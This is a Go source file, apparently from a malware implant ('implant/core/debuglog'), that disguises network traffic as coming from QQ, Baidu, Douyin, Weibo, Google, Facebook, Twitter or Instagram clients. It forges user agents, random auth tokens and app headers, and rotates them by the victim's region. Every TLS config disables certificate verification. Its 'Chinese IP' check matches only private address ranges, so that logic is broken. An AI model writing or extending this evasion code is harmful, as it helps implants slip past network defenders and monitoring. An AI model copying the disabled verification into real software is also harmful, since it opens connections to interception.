package disguise

import (
	"implant/core/debuglog"
	"crypto/rand"
	"crypto/tls"
	"math/big"
	"strings"
	"sync"
)

// ===== 🌍 国际化协议伪装通用模块 =====

// UniversalDisguise 通用伪装器
type UniversalDisguise struct {
	profiles       map[string]*UniversalProfile
	currentProfile string
	region         string // "china" 或 "international"
	mu             sync.RWMutex
}

// UniversalProfile 通用伪装配置
type UniversalProfile struct {
	Name      string            `json:"name"`
	Region    string            `json:"region"`
	UserAgent string            `json:"user_agent"`
	Headers   map[string]string `json:"headers"`
	TLSConfig *tls.Config       `json:"-"`
}

// 全局通用伪装器
var GlobalUniversalDisguise *UniversalDisguise

// InitUniversalDisguise 初始化通用伪装器
func InitUniversalDisguise() error {
	disguise := &UniversalDisguise{
		profiles:       make(map[string]*UniversalProfile),
		currentProfile: "chrome",
		region:         "international",
	}

	disguise.initProfiles()
	GlobalUniversalDisguise = disguise
	debuglog.Println("🌍 [通用伪装] 初始化完成")
	return nil
}

// initProfiles 初始化伪装配置
func (ud *UniversalDisguise) initProfiles() {
	// ===== 🇨🇳 国内API配置 =====
	ud.profiles["qq"] = &UniversalProfile{
		Name:      "qq",
		Region:    "china",
		UserAgent: "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/103.0.0.0 Mobile Safari/537.36 QQ/8.9.28",
		Headers: map[string]string{
			"Accept":           "application/json, text/plain, */*",
			"Accept-Language":  "zh-CN,zh;q=0.9,en;q=0.8",
			"X-Requested-With": "com.tencent.mobileqq",
		},
		TLSConfig: createStandardTLS(),
	}

	ud.profiles["baidu"] = &UniversalProfile{
		Name:      "baidu",
		Region:    "china",
		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
		Headers: map[string]string{
			"Accept":          "application/json, text/javascript, */*; q=0.01",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Origin":          "https://www.baidu.com",
		},
		TLSConfig: createStandardTLS(),
	}

	ud.profiles["douyin"] = &UniversalProfile{
		Name:      "douyin",
		Region:    "china",
		UserAgent: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 aweme/28.8.0",
		Headers: map[string]string{
			"Accept":          "application/json, text/plain, */*",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"X-TT-TOKEN":      generateRandomString(32),
		},
		TLSConfig: createMobileTLS(),
	}

	ud.profiles["weibo"] = &UniversalProfile{
		Name:      "weibo",
		Region:    "china",
		UserAgent: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Weibo",
		Headers: map[string]string{
			"Accept":          "application/json, text/plain, */*",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"X-XSRF-TOKEN":    generateRandomString(32),
		},
		TLSConfig: createMobileTLS(),
	}

	// ===== 🇺🇸 国外API配置 =====
	ud.profiles["google"] = &UniversalProfile{
		Name:      "google",
		Region:    "international",
		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
		Headers: map[string]string{
			"Accept":          "application/json, text/plain, */*",
			"Accept-Language": "en-US,en;q=0.9",
			"X-Client-Data":   generateRandomString(40),
		},
		TLSConfig: createStandardTLS(),
	}

	ud.profiles["facebook"] = &UniversalProfile{
		Name:      "facebook",
		Region:    "international",
		UserAgent: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Version/17.1 Mobile Safari/604.1 FBAN/FBIOS",
		Headers: map[string]string{
			"Accept":               "application/json, text/plain, */*",
			"Accept-Language":      "en-US,en;q=0.9",
			"X-FB-Connection-Type": "WIFI",
		},
		TLSConfig: createMobileTLS(),
	}

	ud.profiles["twitter"] = &UniversalProfile{
		Name:      "twitter",
		Region:    "international",
		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
		Headers: map[string]string{
			"Accept":              "*/*",
			"Accept-Language":     "en-US,en;q=0.9",
			"Authorization":       "Bearer " + generateRandomString(110),
			"X-Twitter-Auth-Type": "OAuth2Session",
		},
		TLSConfig: createStandardTLS(),
	}

	ud.profiles["instagram"] = &UniversalProfile{
		Name:      "instagram",
		Region:    "international",
		UserAgent: "Instagram 302.0.0.23.103 Android (33/13; 420dpi; 1080x2340; samsung; SM-G991B)",
		Headers: map[string]string{
			"Accept":          "*/*",
			"Accept-Language": "en-US,en;q=0.9",
			"X-IG-App-ID":     "936619743392459",
		},
		TLSConfig: createMobileTLS(),
	}

	// 通用配置
	ud.profiles["chrome"] = &UniversalProfile{
		Name:      "chrome",
		Region:    "universal",
		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
		Headers: map[string]string{
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language": "en-US,en;q=0.9",
		},
		TLSConfig: createStandardTLS(),
	}
}

// DetectAndSetRegion 检测并设置地区
func (ud *UniversalDisguise) DetectAndSetRegion(clientIP string) {
	region := "international"
	if isChineseIP(clientIP) {
		region = "china"
	}

	ud.mu.Lock()
	ud.region = region
	ud.mu.Unlock()

	ud.SwitchToRegionalProfile()
	debuglog.Printf("🌍 [地区检测] IP: %s, 地区: %s\n", clientIP, region)
}

// SwitchToRegionalProfile 切换到地区适配的配置
func (ud *UniversalDisguise) SwitchToRegionalProfile() {
	ud.mu.Lock()
	defer ud.mu.Unlock()

	var regionalProfiles []string
	switch ud.region {
	case "china":
		regionalProfiles = []string{"qq", "baidu", "douyin", "weibo"}
	case "international":
		regionalProfiles = []string{"google", "facebook", "twitter", "instagram"}
	default:
		regionalProfiles = []string{"chrome"}
	}

	if len(regionalProfiles) > 0 {
		newProfile := regionalProfiles[randomInt(0, len(regionalProfiles))]
		oldProfile := ud.currentProfile
		ud.currentProfile = newProfile
		debuglog.Printf("🔄 [地区切换] %s -> %s (地区: %s)\n", oldProfile, newProfile, ud.region)
	}
}

// GetCurrentProfile 获取当前配置
func (ud *UniversalDisguise) GetCurrentProfile() *UniversalProfile {
	ud.mu.RLock()
	defer ud.mu.RUnlock()

	if profile, exists := ud.profiles[ud.currentProfile]; exists {
		return profile
	}
	return ud.profiles["chrome"]
}

// GetTLSConfig 获取TLS配置
func (ud *UniversalDisguise) GetTLSConfig() *tls.Config {
	profile := ud.GetCurrentProfile()
	if profile.TLSConfig != nil {
		return profile.TLSConfig
	}
	return createStandardTLS()
}

// GetHTTPHeaders 获取HTTP头部
func (ud *UniversalDisguise) GetHTTPHeaders() map[string]string {
	profile := ud.GetCurrentProfile()
	headers := make(map[string]string)

	for k, v := range profile.Headers {
		headers[k] = v
	}
	headers["User-Agent"] = profile.UserAgent

	return headers
}

// ===== 工具函数 =====

func createStandardTLS() *tls.Config {
	return &tls.Config{
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
		NextProtos:         []string{"h2", "http/1.1"},
		InsecureSkipVerify: true,
	}
}

func createMobileTLS() *tls.Config {
	return &tls.Config{
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
		NextProtos:         []string{"h2", "http/1.1"},
		InsecureSkipVerify: true,
	}
}

func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		b[i] = charset[n.Int64()]
	}
	return string(b)
}

func randomInt(min, max int) int {
	if max <= min {
		return min
	}
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min)))
	return min + int(n.Int64())
}

func isChineseIP(ip string) bool {
	// 简化的中国IP判断逻辑
	return strings.HasPrefix(ip, "192.168.") ||
		strings.HasPrefix(ip, "10.") ||
		ip == "127.0.0.1"
}
